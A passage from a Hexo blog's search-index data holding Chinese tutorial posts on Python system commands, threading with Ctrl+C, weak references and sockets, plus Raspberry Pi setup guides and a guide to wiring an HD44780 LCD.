-= 1 except KeyboardInterrupt, e: print u&quot;用户强制中止&quot; if retryTimes == 0: exit() return Nonedef uread(u): data = u.read() return datadef uclose(u): u.close()# 格式化文件大小# 如 10 =&gt; &quot;10B&quot;, 1024 =&gt; &quot;1.00KB&quot;...def formatSize(size): if size &gt; pow(1024, 2): new_size = size / pow(1024, 2) postfix = &quot;MB&quot; elif size &gt; 1024: new_size = size / 1024 postfix = &quot;KB&quot; else: new_size = size postfix = &quot;B&quot; strsize = &quot;%.2f&quot; % new_size return strsize + postfixif __name__ == '__main__': # 单元测试 pass 注：在编写过程中，我一如既往地遇到了令人绝望的编码问题。我开发平台用的是 Windows 7，Python 2.7，折腾了好久，最后终于得到一个比较完美解决乱码问题的方法，即： 在程序中无论何时都使用 unicode 处理字符串，因为 BeautifulSoup3 默认返回 unicode，我们要做的只是给自己的字符串前加一个 ‘u’，然后尽情地使用 unicode 吧。 可以直接将 unicode 输出到 IDLE 或 cmd.exe，系统会自动转换为 gbk 输出（前提是你系统的代码页是 cp936 或 gbk）。 保存文本文件时，将 unicode 转换为 utf-8 存入，读取时，将 utf-8 转换为 unicode。 至于 linux 下，我还没有试过，改天测试一下。 （未完待续）","link":"/hexo-blog/2013/04/01/%E5%88%A9%E7%94%A8-Python-%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%9B%BE%E7%A8%8B%E5%BA%8F/"},{"title":"Python执行系统命令的方法","text":"(1) os.system# 仅仅在一个子终端运行系统命令，而不能获取命令执行后的返回信息 system(command) -&gt; exit_statusExecute the command (a string) in a subshell. # 如果再命令行下执行，结果直接打印出来 1234&gt;&gt;&gt; os.system('ls')04101419778.CHM bash document media py-django video11.wmv books downloads Pictures pythonall-20061022 Desktop Examples project tools (2) os.popen# 该方法不但执行命令还返回执行后的信息对象 popen(command [, mode=’r’ [, bufsize]]) -&gt; pipeOpen a pipe to/from a command returning a file object. 例如： 1234567891011121314151617&gt;&gt;&gt; tmp = os.popen('ls *.py').readlines()&gt;&gt;&gt; tmpOut[21]:['dump_db_pickle.py ','dump_db_pickle_recs.py ','dump_db_shelve.py ','initdata.py ','__init__.py ','make_db_pickle.py ','make_db_pickle_recs.py ','make_db_shelve.py ','peopleinteract_query.py ','reader.py ','testargv.py ','teststreams.py ','update_db_pickle.py ','writer.py '] 好处在于：将返回的结果赋于一变量，便于程序的处理。 (3) 使用模块 subprocess12&gt;&gt;&gt; import subprocess&gt;&gt;&gt; subprocess.call([&quot;cmd&quot;, &quot;arg1&quot;, &quot;arg2&quot;],shell=True) 获取返回和输出: 12345import subprocessp = subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)for line in p.stdout.readlines(): print line,retval = p.wait() (4) 使用模块 commands12345678&gt;&gt;&gt; import commands&gt;&gt;&gt; dir(commands)['__all__', '__builtins__', '__doc__', '__file__', '__name__', 'getoutput', 'getstatus','getstatusoutput', 'mk2arg', 'mkarg']&gt;&gt;&gt; commands.getoutput(&quot;date&quot;)'Wed Jun 10 19:39:57 CST 2009'&gt;&gt;&gt;&gt;&gt;&gt; commands.getstatusoutput(&quot;date&quot;)(0, 'Wed Jun 10 19:40:41 CST 2009') 注意： 当执行命令的参数或者返回中包含了中文文字，那么建议使用subprocess，如果使用os.popen则会出现下面的错误: 1234567Traceback (most recent call last): File &quot;./test1.py&quot;, line 56, inmain() File &quot;./test1.py&quot;, line 45, in main fax.sendFax() File &quot;./mailfax/Fax.py&quot;, line 13, in sendFax os.popen(cmd)UnicodeEncodeError: 'ascii' codec can't encode characters in position 46-52: ordinal not inrange(128)","link":"/hexo-blog/2013/04/13/Python%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"Python 中用 Ctrl+C 终止多线程程序的问题解决","text":"花了一天时间用python为服务写了个压力测试。很简单，多线程向服务器发请求。但写完之后发现如果中途想停下来，按Ctrl+C达不到效果，自然想到要用信号处理函数捕捉信号，使线程都停下来，问题解决的方法请往下看： 12345678910111213141516171819202122232425262728293031#!/bin/env python# -*- coding: utf-8 -*-#filename: peartest.pyimport threading, signalis_exit = Falsedef doStress(i, cc): global is_exit idx = i while not is_exit: if (idx &lt; 10000000): print &quot;thread[%d]: idx=%d&quot;%(i, idx) idx = idx + cc else: break print &quot;thread[%d] complete.&quot;%idef handler(signum, frame): global is_exit is_exit = True print &quot;receive a signal %d, is_exit = %d&quot;%(signum, is_exit)if __name__ == &quot;__main__&quot;: signal.signal(signal.SIGINT, handler) signal.signal(signal.SIGTERM, handler) cc = 5 for i in range(cc): t = threading.Thread(target=doStress, args=(i,cc)) t.start() 上面是一个模拟程序，并不真正向服务发送请求，而代之以在一千万以内，每个线程每隔并发数个（cc个）打印一个整数。很明显，当所有线程都完成自己的任务后，进程会正常退出。但如果我们中途想退出（试想一个压力测试程序，在中途已经发现了问题，需要停止测试），该肿么办？你当然可以用ps查找到进程号，然后kill -9杀掉，但这样太繁琐了，捕捉Ctrl+C是最自然的想法。上面示例程序中已经捕捉了这个信号，并修改全局变量is_exit，线程中会检测这个变量，及时退出。 但事实上这个程序并不work，当你按下Ctrl+C时，程序照常运行，并无任何响应。网上搜了一些资料，明白是python的子线程如果不是daemon的话，主线程是不能响应任何中断的。但设为daemon后主线程会随之退出，接着整个进程很快就退出了，所以还需要在主线程中检测各个子线程的状态，直到所有子线程退出后自己才退出，因此上例29行之后的代码可以修改为： 12345678threads=[]for i in range(cc): t = threading.Thread(target=doStress, args=(i, cc)) t.setDaemon(True) threads.append(t) t.start()for i in range(cc): threads[i].join() 重新试一下，问题依然没有解决，进程还是没有响应Ctrl+C，这是因为join()函数同样会waiting在一个锁上，使主线程无法捕获信号。因此继续修改，调用线程的isAlive()函数判断线程是否完成： 123456while 1: alive = False for i in range(cc): alive = alive or threads[i].isAlive() if not alive: break 这样修改后，程序完全按照预想运行了：可以顺利的打印每个线程应该打印的所有数字，也可以中途用Ctrl+C终结整个进程。完整的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/bin/env python# -*- coding: utf-8 -*-#filename: peartest.pyimport threading, signalis_exit = Falsedef doStress(i, cc): global is_exit idx = i while not is_exit: if (idx &lt; 10000000): print &quot;thread[%d]: idx=%d&quot;%(i, idx) idx = idx + cc else: break if is_exit: print &quot;receive a signal to exit, thread[%d] stop.&quot;%i else: print &quot;thread[%d] complete.&quot;%idef handler(signum, frame): global is_exit is_exit = True print &quot;receive a signal %d, is_exit = %d&quot;%(signum, is_exit)if __name__ == &quot;__main__&quot;: signal.signal(signal.SIGINT, handler) signal.signal(signal.SIGTERM, handler) cc = 5 threads = [] for i in range(cc): t = threading.Thread(target=doStress, args=(i,cc)) t.setDaemon(True) threads.append(t) t.start() while 1: alive = False for i in range(cc): alive = alive or threads[i].isAlive() if not alive: break 其实，如果用python写一个服务，也需要这样，因为负责服务的那个线程是永远在那里接收请求的，不会退出，而如果你想用Ctrl+C杀死整个服务，跟上面的压力测试程序是一个道理。 总结一下，python多线程中要响应Ctrl+C的信号以杀死整个进程，需要： 把所有子线程设为Daemon； 使用isAlive()函数判断所有子线程是否完成，而不是在主线程中用join()函数等待完成； 写一个响应Ctrl+C信号的函数，修改全局变量，使得各子线程能够检测到，并正常退出。","link":"/hexo-blog/2013/04/24/Python-%E4%B8%AD%E7%94%A8-Ctrl-C-%E7%BB%88%E6%AD%A2%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"},{"title":"Python 引用，拷贝，对象回收，弱引用","text":"引用python中，在对对象赋值，参数传递，函数返回等等, 都是引用传递的. 直接copy个例子来【1】： 1234a = [1, 2, 3]b = ab.append(5)print a, b 输出结果为： 1[1, 2, 3, 5] [1, 2, 3, 5] 面的结果有助于理解引用的实际情况。 具体查看一个对象的引用数，可以使用sys.getrefcount(ojb)获取，但这个函数有点邪恶，有时似乎并不给出正确的结果，正常来说获取的值都比你想要的大，一般是大1，因为给这个函数传参数也算一个引用。但有时会大得离谱，来例子： 123import sysa = &quot;a&quot;sys.getrefcount(a) 在我的机器上，输出结果尽然为14，网络遛了一圈，有人说是python内部对“a”这个对象进行了引用。好吧！就这样理解把，有高见的可以留言告我一下！ 拷贝【1】拷贝主要有两种拷贝，分别以copy模块中的两个函数copy和deepcopy为代表。其中，前者复制对象本身，但对于对象中得元素，还是会使用的原本引用，copy个例子来： 1234list_of_lists = [ ['a'], [1, 2], ['z', 23] ]copy_lol = copy.copy(lists_of_lists)copy_lol[1].append('boo')print list_of_lists, copy_lol 输出结果为： 1[['a'], [1, 2, 'boo'], ['z', 23]] [['a'], [1, 2, 'boo'], ['z', 23]] 考到第二个元素的情况了 把！用的还是引用。要想全部对对象本省进行拷贝，就得使用deepcopy了。 对象回收Python使用了垃圾回收器来自动销毁那些不再使用的对象。当对某个对象的引用计数为0时， Python能够安全地销毁这个对象。表面上看来，在使用C或者C++时经常会碰到的内存泄露问题似乎也就解决了，但实际的情况是，请你小心！再copy个例子来【2】： 12345678910111213class LeakTest(object): def __init__(self): print 'Object with id %d born here.' % id(self) def __del__(self): print 'Object with id %d dead here.' % id(self)def foo(): A = LeakTest() B = LeakTest() A.b = B B.a = Aif __name__ = =&quot;__main__&quot;: foo() 运行结果为： 12Object with id 10462448 born here.Object with id 10462832 born here. 在构造一个类时，__init__会被自动调用；在进行对象回收时，__del__会被调用。很清楚的看到对象只是被创建了，而没有被回收，原因很简单，A和B的由于互相引用，他们的引用次数是不可能为0的，自然被回收也是不可能的了。这是，就应该考虑弱引用了。 弱引用这是相对上面“引用”的一个概念，主要不同体现在对象回收时，上面我只提到当引用数为0，对象就会自动回收。其实还有另外一种情况，当自由只有对对象的弱引用时，对象也是会被回收。直接上代码，对上例做出一些修改： 1234567891011121314import weakrefclass LeakTest(object): def __init__(self): print 'Object with id %d born here.' % id(self) def __del__(self): print 'Object with id %d dead here.' % id(self)def foo(): A = LeakTest() B = LeakTest() A.b = weakref.proxy(B) B.a = weakref.proxy(A)if __name__ = =&quot;__main__&quot;: foo() 运行结果为： 1234Object with id 28637456 born here.Object with id 29402736 born here.Object with id 28637456 dead here.Object with id 29402736 dead here. OK了，对象被正常回收了！最后简单解说wekref中得几个函数【3】： 1. 创建弱引用： 你可以通过调用weakref模块的ref(obj[,callback])来创建一个弱引用，obj是你想弱引用的对象，callback是一个可选的函数，当因没有引用导致Python要销毁这个对象时调用。回调函数callback要求单个参数（弱引用的对象）。一旦你有了一个对象的弱引用，你就能通过调用弱引用来获取被弱引用的对象。下面的例子创建了一个对socket对象的弱引用： 12345678910&gt;&gt;&gt; from socket import * &gt;&gt;&gt; import weakref &gt;&gt;&gt; s=socket(AF_INET,SOCK_STREAM) &gt;&gt;&gt; ref=weakref.ref(s) &gt;&gt;&gt; s &lt;socket._socketobject instance at 007B4A94&gt; &gt;&gt;&gt; ref &lt;weakref at 0x81195c; to 'instance' at 0x7b4a94&gt; &gt;&gt;&gt; ref() #调用它来访问被引用的对象 &lt;socket.socketobject instance at 007B4A94&gt; 2. 创建代理对象代理对象是弱引用对象，它们的行为就像它们所引用的对象，这就便于你不必首先调用弱引用来访问背后的对象。通过weakref模块的proxy(obj[,callback])函数来创建代理对象。使用代理对象就如同使用对象本身一样： 123456789&gt;&gt;&gt; from socket import * &gt;&gt;&gt; import weakref &gt;&gt;&gt; s=socket(AF_INET,SOCK_STREAM) &gt;&gt;&gt; ref=weakref.proxy(s) &gt;&gt;&gt; s &lt;socket._socketobject instance at 007E4874&gt; &gt;&gt;&gt; ref &lt;socket._socketobject instance at 007E4874&gt; &gt;&gt;&gt; ref.close() #对象的方法同样工作 callback参数的目的和ref函数相同。在Python删除了一个引用的对象之后，使用代理将会导致一个weakref.ReferenceError错误： 1234&gt;&gt;&gt; del s &gt;&gt;&gt; ref Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in ? 3. getweakrefcount(obj)和getweakrefs(obj)分别返回弱引用数和关于所给对象的引用列表 参考文献【1】 http://blog.sina.com.cn/s/blog_5357c0af0100n2q5.html 【2】http://linhs.blog.51cto.com/370259/142846/ 【3】http://longmans1985.blog.163.com/blog/static/70605475200991613556128/","link":"/hexo-blog/2013/04/27/Python-%E5%BC%95%E7%94%A8%EF%BC%8C%E6%8B%B7%E8%B4%9D%EF%BC%8C%E5%AF%B9%E8%B1%A1%E5%9B%9E%E6%94%B6%EF%BC%8C%E5%BC%B1%E5%BC%95%E7%94%A8/"},{"title":"Python 多线程响应 Ctrl + C，用 Event 实现","text":"在用 python 编写多线程程序时，经常需要用 Ctrl + C 中止进程，可是大家都知道，在 python 中，除了主线程可以响应控制台的 Ctrl + C ，其他线程是无法捕获到的，也就是说，当主线程被中止后，其他线程也会被强制中止，这样线程们就没有机会处理自己还没有完成的工作。 而在实际应用中，我们可能会有这样的要求： 当按下 Ctrl + C 时，我们希望所有线程先处理完自己的任务，再主动停止 当所有线程停止后，主线程才终止 【这篇文章】提供了一种方法，我对其做了进一步改进，写了如下的代码，希望能起到抛砖引玉的作用： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-import threadingclass MyThread(object): def __init__(self, thread_num): self.thread_num = thread_num # 线程个数 self.outLock = threading.Lock() # 控制台输出锁 self.threads = [] # 线程列表 self.interruptEvent = threading.Event() # 键盘中断事件 def beginTask(self): # 将线程加入线程列表 for i in range(self.thread_num): t_name = str(i + 1) thread = threading.Thread(target=self.doSomething, kwargs={&quot;t_name&quot;: t_name}) self.threads.append(thread) # 启动线程 for thread in self.threads: thread.start() self.interruptEvent.clear() # clear # 用 isAlive 循环判断代替线程的 join 方法 while True: try: alive = False for thread in self.threads: alive = alive or thread.isAlive() if not alive: break except KeyboardInterrupt: self.interruptEvent.set() # set def doSomething(self, t_name): self.outLock.acquire() print u&quot;线程 %s 已启动&quot; % t_name self.outLock.release() while True: try: if self.interruptEvent.isSet(): # isSet raise KeyboardInterrupt ######################## # doSomething 函数代码 # ######################## except KeyboardInterrupt: ################## # 处理最后的工作 # ################## self.outLock.acquire() print u&quot;用户强制中止主线程，线程 %s 已中止&quot; % t_name self.outLock.release() break self.outLock.acquire() print u&quot;线程 %s 已停止&quot; % t_name self.outLock.release() if __name__ == &quot;__main__&quot;: t = MyThread(5) t.beginTask() 程序启动后，如图 1 所示： 按下 Ctrl + C 后，如图 2 所示： 这样各个线程都有机会处理自己的任务后主动停止，随后主线程再终止。","link":"/hexo-blog/2013/05/05/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%93%8D%E5%BA%94-Ctrl-C%EF%BC%8C%E7%94%A8-Event-%E5%AE%9E%E7%8E%B0/"},{"title":"Python 实现 socket 通讯 (TCP&#x2F;UDP)","text":"1. TCP1.1 TCP-Server12345678910111213141516171819202122232425262728293031323334353637# -*- coding: utf-8 -*-# TCP-Serverimport socket# 1. 创建 socket 对象s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 2. 将 socket 绑定到指定地址address = ('127.0.0.1', 10140) s.bind(address)# 3. 接收连接请求s.listen(5)# 4. 等待客户请求一个连接# 调用 accept 方法时，socket 会进入 &quot;waiting&quot; 状态。# accept方法返回一个含有两个元素的元组 (connection, address)。# 第一个元素 connection 是新的 socket 对象，服务器必须通过它与客户通信；# 第二个元素 address 是客户的 Internet 地址。ss, addr = s.accept()print 'got connect from', addr# 5. 处理：服务器和客户端通过 send 和 recv 方法通信# send 方法返回已发送的字节个数。# 调用 recv 时，服务器必须指定一个整数，它对应于可通过本次方法调用来接收的最大数据量。# recv方法在接收数据时会进入 &quot;blocked&quot; 状态，最后返回一个字符 串，用它表示收到的数据。# 如果发送的数据量超过了recv 所允许的，数据会被截短。# 多余的数据将缓冲于接收端。以后调用recv时，多余的数据会从缓冲区删除。while True: ra = ss.recv(512) print 'client:', ra ss.send('received')# 6. 传输结束，关闭连接ss.close()s.close() 2.2 TCP-Client123456789101112131415161718# -*- coding: utf-8 -*-# TCP-Clientimport socketaddress = ('127.0.0.1', 10140)s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect(address)while True: message = raw_input() if not message: break s.send(message) data = s.recv(512) print 'server:', datas.close() 2. UDP2.1 UDP-Server1234567891011121314# -*- coding: utf-8 -*-# UDP-Serverimport socketaddress = ('127.0.0.1', 10141)s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)s.bind(address)while True: data, addr = s.recvfrom(2048) print &quot;received:&quot;, data, &quot;from&quot;, addrs.close() 2.2 UDP-Client123456789101112131415# -*- coding: utf-8 -*-# UDP-Clientimport socket address = ('127.0.0.1', 10141) s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) while True: message = raw_input() if not message: break s.sendto(message, address) s.close()","link":"/hexo-blog/2013/08/28/Python-%E5%AE%9E%E7%8E%B0-socket-%E9%80%9A%E8%AE%AF-TCP-UDP/"},{"title":"Hello Word ～ v0.2.2 背单词软件发布","text":"Hello Word ~功能基于艾宾浩斯记忆曲线，强大的单词记忆软件，为用户提供简单、科学、高效的背单词方法。 用户小学生、中学生、大学生、研究生、博士生、教师、出国留学者，以及各类英语学习者。 特性 基于艾宾浩斯记忆曲线 实时发音，男声/女声可任意切换（需要联网哦） 托盘图标人性化提醒 自由选择词库 使用 Python + Qt 开发 截图 下载 Windows x86-32bit 下载地址 x64-64bit 下载地址 Linux Fedora 17 即将推出 作者whypro @ Whypro Studio 鳗鱼工作室技术博客 2013-09-03","link":"/hexo-blog/2013/09/03/Hello-Word-%EF%BD%9E-v0-2-2-%E8%83%8C%E5%8D%95%E8%AF%8D%E8%BD%AF%E4%BB%B6%E5%8F%91%E5%B8%83/"},{"title":"为树莓派制作 Arch Linux SD 卡","text":"该文为译文，原文地址： http://archlinuxarm.org/platforms/armv6/raspberry-pi 将下面的 sdX 替换成你的 SD 卡的设备名。 使用 fdisk 为 SD 卡分区： 1fdisk /dev/sdX 根据 fdisk 的提示删除旧分区。然后创建一个新分区： 输入 o。这将清除驱动器上的所有分区。 输入 p 列出分区。列表中应该没有任何分区了。 输入 n，然后 p 设置为主分区，1 设置为驱动器第一个分区，按 回车 不更改起始扇区的默认值，输入 +100M 设置结束扇区。 输入 t，然后 c 将第一个分区设为 W95 FAT32 (LBA) 格式。 输入 n，然后 p 设置为主分区，2 设置为驱动器第二个分区，按 回车 不更改起始扇区和结束扇区的默认值。 输入 w 保存分区表退出。 创建并挂载 FAT 文件系统： 123mkfs.vfat /dev/sdX1mkdir bootmount /dev/sdX1 boot 创建并挂载 ext4 文件系统： 123mkfs.ext4 /dev/sdX2mkdir rootmount /dev/sdX2 root 下载并解压 root 文件系统（用 root 身份，而不是 sudo）： 123wget http://archlinuxarm.org/os/ArchLinuxARM-rpi-2-latest.tar.gzbsdtar -xpf ArchLinuxARM-rpi-2-latest.tar.gz -C rootsync 将 boot 文件移动至第一个分区： 1mv root/boot/* boot 卸载这两个分区： 1umount boot root 将 SD 卡插入树莓派，连接至以太网，提供 5V 电源。 使用串口终端或者 SSH 访问路由器提供的树莓派 IP 地址，默认 root 密码为 root。","link":"/hexo-blog/2015/04/08/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%B6%E4%BD%9C-Arch-Linux-SD-%E5%8D%A1/"},{"title":"树莓派 Raspberry-Pi 折腾系列：系统安装及一些必要的配置","text":"原文地址： http://www.cnblogs.com/abel/p/3441175.html 入手树莓派将近一个月了，很折腾，许多资源不好找，也很乱。简单整理一下自己用到的东西，方便以后自己或别人继续折腾。 操作系统下载树莓派官方 Raspbian 系统下载：http://www.raspberrypi.org/downloads 或直接下载 http://downloads.raspberrypi.org/raspbian_latest.torrent 最新版的 BT 种子。 还有一个选择是由国人制作的超级精简版，更低内存占用：http://pan.baidu.com/share/link?shareid=167943&amp;uk=1412008571 系统安装所谓“安装系统”其实不如说是“恢复”下载到的系统镜像到内存卡上，这个过程也没什么难度，就是看内存卡的速度，慢慢等而已。需要注意的是，市面上部分 4G 的内存卡，实际大小才 3.6G 多，会提示空间不足，所以还是直接购买 8G 吧，也差不了几块钱。 在 Windows 下可以使用 Win32 Disk Imager 进行镜像恢复，非常方便，也是树莓派官方推荐的方法。官方下载地址：http://sourceforge.net/projects/win32diskimager/ 通过 SSH 远程访问老实说，我一直把树莓派定位为“一个扔在某个角落就可以自己跑得很欢的小电脑”，加上那仅有的两个 USB 口，一个插了 USB 无限网卡，另一个再拖个键盘或鼠标啥的，实在很不方便，那么最好还是能远程访问吧。 好在树莓派默认是有开启 SSH 的，但是我们系统刚安装，IP 还没设置，怎么找到它的 IP 地址呢？这时候就推荐使用另一个神器 PortScan 来找出我们的机器： 打开 PortScan 选择扫描范围，可以很方便的找出局域网中的其它机器，一般家庭中也没太多机器，找出树莓派是很容易的，如果是在公司，有很多机器的话，那么可以忽略那些有机器名的，然后剩下的一个一个尝试吧… PortScan 下载地址：http://abel.oss.aliyuncs.com/file/PortScan.zip ROOT 账号设置如果你安装的是官方的 Raspbian 系统，那么默认的登录帐号为 pi 密码是 raspberry 为了方便折腾，建议第一时间启用 ROOT 账号吧~ 这个也很简单的，只需要执行一下两句命令即可： 12345# 设置 root 账号的密码，会让你输入两次新密码sudo passwd root# 启用 root 账号登录sudo passwd --unlock root 执行完之后，用 reboot 命令重启就可以用 root 登录啦。 扩展可用空间第一次用 root 登录，会自动弹出树莓派的高级设置面板（以后也可以通过 raspi-config 命令进入）： 选择第一项 Expand Filesystem 扩展 SD 卡上可用的空间，不然以后会有很多大软件，不能安装（提示空间不足，例如 mysql）。 扩展之后可以通过 df -h 命令看到效果~ 更换软件源（apt-get sources）树莓派的服务器实在太太太太太太慢了！会导致你安装一个几M的东西都要等大半天！肿么办！ 好在树莓派官方有提供一个镜像列表：http://www.raspbian.org/RaspbianMirrors 在里面找到了几个国内的镜像，经过几番尝试，觉得来自中科大的速度非常不错~ 咱们就换成中科大的吧，镜像主页：https://lug.ustc.edu.cn/wiki/mirrors/help/raspbian 根据教程，咱们来编辑 /etc/apt/sources.list 文件。这里推荐用 nano 命令编辑，舍得去弄什么 VIM 啦。命令如下： 1nano /etc/apt/sources.list 进入编辑界面，删除原有的内容，粘贴中科大提供的内容，结果如下： 然后使用 Ctrl+O 保存文件，Ctrl+X 退出编辑器。 然后执行 apt-get update 命令更新软件列表。 设置静态 IP 地址回到刚刚第二点提到的，不知道 IP 地址的问题，咱们要给树莓派设置一个静态 IP，省得 IP 变换又要重新找机器。还是用 nano 来编辑网络接口文件： 1nano /etc/network/interfaces 如果你要设置的是有线网卡的 IP 地址，那么把 eth0 的 dhcp 改成 static 然后在下一行追加 IP 信息，结果大概如下： 1234iface eth0 inet staticaddress 192.168.1.200 # 设定的静态IP地址netmask 255.255.255.0 # 网络掩码gateway 192.168.1.1 # 网关 如果你要设置的是无线网卡的，那么除了把 wlan0 的 dhcp 改成 static 之外，还需要填写无线网的名称和密码，编辑后的结果大概如下： 12345678iface wlan0 inet static wpa-ssid Your_Wifi_SSID wpa-psk Your_Wifi_Passwordaddress 192.168.1.200 # 设定的静态IP地址netmask 255.255.255.0 # 网络掩码gateway 192.168.1.1 # 网关network 192.168.1.1 # 网络地址# wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf ▲ 注意注释掉最后一行 搞定之后，咱们用 poweroff 命令关掉树莓派，等到机器上的绿灯不闪了，把电源拔掉，再把网线拔掉，重新连接电源，稍等一会，看看是不是就通过无线网络的 IP 地址可以访问了。 最后至此，要折腾树莓派的几个准备工作都完成了，有了这些，以后折腾也更佳方便。 由于我当初手贱没有购买面驱动的 USB 网卡，买的是一个要自己编译驱动的，所以我折腾的东西还有很多，下次专门再来说说无线网卡驱动的事吧。","link":"/hexo-blog/2015/04/08/%E6%A0%91%E8%8E%93%E6%B4%BE-Raspberry-Pi-%E6%8A%98%E8%85%BE%E7%B3%BB%E5%88%97%EF%BC%9A%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%BF%85%E8%A6%81%E7%9A%84%E9%85%8D%E7%BD%AE/"},{"title":"用树莓派驱动一个 16×2 的 LCD","text":"原文链接：Mikey Sklar译文链接：http://www.geekfan.net/5588/ 翻译：极客范 - tien 不管什么项目，如果加上一个液晶显示屏的话肯定都会看起来更棒。这篇文章将详解如何用树莓派的六个通用端口（GPIO）来连接一个廉价的HDD44780的小型LCD。当然也有用I2C或是UART来连接LCD的， 但是使用GPIO是最直接的方法。 这种方法的几个优势： 使得廉价的LCD得以应用 不需要I2C的驱动器 不会占用树莓派仅有的USB口 以下是用Python代码控制显示的时间日期以及IP地址。如果你的树莓派运行在Headless模式下（Headless模式是系统的一种配置模式。在该模式下系统缺少了显示设备、键盘或鼠标），能有个小的显示屏显示IP地址可是很有吸引力的。 以下是完成本次教程的必要硬件 一个标准的16×2的LCD Adafruit Pi Cobbler （树莓派GPIO的扩展设备，这里是以Cobbler为例，当然也可以用树莓派的breakout） 面包板 连接线 一个树莓派 本教程只适用于16×1, 16×2, 20×2, 20×4 的LCD 连接Cobbler到LCD上LCD 任何一个拥有16个引脚的LCD基本上都是用HD44780控制器来控制的。 这种类型的LCD的引脚都拥有相同的输入输出功能，所以比较容易使用。LCD采用的是并行接口，这就意味着树莓派需要提供多个引脚来控制它。本篇教程中我们会用到树莓派的4个数据引脚（4位模式）和两个控制引脚。 数据引脚可以直接传输数据到LCD上， 这里我们只让LCD处于写模式，不读取任何数据。 寄存器的选择引脚有两种用途。当设置为低位时，它可以发送指令到LCD（比如显示的位置或是清空屏幕），可理解为命令寄存器。 当设置为高位的时候，它使得LCD转为数据模式并且将数据传输到屏幕上。 读/写引脚在这里会被设置成低位（写模式），因为我们只是想让LCD作为一个输出设备。 LCD 各个引脚的定义： Ground VCC - 5v not 3.3v Contrast adjustment (VO) from potentiometer Register Select (RS). RS=0: Command, RS=1: Data Read/Write (R/W). R/W=0: Write, R/W=1: Read (we won’t use this pin) Clock (Enable). Falling edge triggered Bit 0 (Not used in 4-bit operation) Bit 1 (Not used in 4-bit operation) Bit 2 (Not used in 4-bit operation) Bit 3 (Not used in 4-bit operation) Bit 4 Bit 5 Bit 6 Bit 7 Backlight LED Anode (+) Backlight LED Cathode (-) 在连接这些引脚之前，先确认你的LCD的背光是否可以正常工作，背光应为LED的背光因为这只需要10－40mA的功率，但是若为EL的背光就需要200mA以上的功率了。EL背光的LCD往往会便宜些但是用起来比较难操作，确保你的LCD不是EL背光，否则会将整个树莓派的功率拖下来。还有一些LCD的LED背光没有自带的稳压电阻，所以在连接前要去确定好你的LCD是否需要加载额外的电阻来保证背光LED正常工作。 线路图 首先将Cobber的电源引脚连接到面包板的供电轨上。+5V的用红线连接到红线轨上（译者认为这里连接3.3V的就够了）， GND用黑线连接到蓝线轨上， 为了能使数据传到LCD上，我们将进行以下的连接。 LCD的Pin 1脚接地(黑线) LCD的Pin 2脚接 +5V(红线) LCD的Pin 3脚接到分压器的中间位置（橙线） LCD的Pin 4脚接到Cobber的 #25位 （黄线） LCD的Pin 5脚接地（黑线） LCD的Pin 6脚接到Cobber的#24位 LCD的Pin 7，8，9，10什么都不接 LCD的Pin 11脚接 Cobber的 ＃23位（蓝线） LCD的Pin 12脚接 Cobber的 ＃17位 （紫线） LCD的Pin 13脚接 Cobber的 ＃21位 （灰线）（译者推荐这里连接＃18位） LCD的Pin 14脚接 Cobber的 ＃22位 （白线） LCD的Pin 15脚接 +5V（红线） LCD的Pin 16脚接地 （黑线） 分压器左边的引脚接地（黑线），右边的引脚接+5V（红线）。 原理图 5V LCD vs 3.3V Pi树莓派配置的通用接口（GPIO）为3.3V，但是我们的LCD是需要5V配电的设备。如果我们仅仅是用LCD做树莓派的输出设备的话，连接5V的引脚当然没有问题。所以我们这里不使用Cobbler上3.3V的Pin口，并且我们将LCD上的RW（读写）脚接地，这样就避免了LCD向树莓派发送+5V的信号。 准备LCD在你开始前，确认你有一组 0.1“规格的引脚和一个阻值为10K的分压器。 大部分LCD显示屏是需要16个引脚的，如果头部太长，可以适当剪短到合适的长度即可。 接着你需要将引脚和LCD焊接到一起。你必须这么做，不能只是扣上去就完事了。 首先将Cobbler上的+5V引脚跟GND引脚连接到面包板上。接着如图连接LCD的Pin1脚、Pin2脚、Pin15脚和Pin16脚连接到面包板的供电轨上。这个时候LCD的背光应该就亮了，如果没有亮请检查你的线路是否连接正常。 接着，将分压器中间的引脚按图中所示连接到LCD的Pin脚3上，其他两个引脚分别连接5V电源和地线。 扭动分压器直到LCD的第一行显示出方块来。如果看不到，检查一下线路是否连接正确。 按照电路图所示完成LCD最后RS（Pin 4脚），RW（Pin 5脚）， EN（Pin 6脚）， D4（Pin 11脚）， D5（Pin 12脚）， D6（Pin 13脚）和D7（Pin 14脚）的连接。 到这里，就可以用Python脚本来驱动LCD显示些东西了。 必要的Python包本教程是基于Debian的Wheezy系统写成的。必须要安装以下组件才能使用树莓派的GPIO口。 安装python（2.x）的最新开发套件： 安装如下组件： 123sudo apt-get install python-setuptoolssudo easy_install -U distribute sudo apt-get install python-pip 安装 RPi.GPIO 0.3.1a: 1sudo pip install rpi.gpio Python脚本代码可以在Github获得控制LCD的Python脚本。其中包括两个文件： Adafruit_CharLCD.py —该文件中包含用来控制LCD的Python类 Adafruit_CharLCD_IPclock_example.py — 样例程序，用来显示IP地址、日期时间。 第一个文件Adafruit_CharLCD.py将两个LCD的控制代码混合在了一起。感谢Github上的用户lrvick，他用一个Python类将它们漂亮的封装在一起。 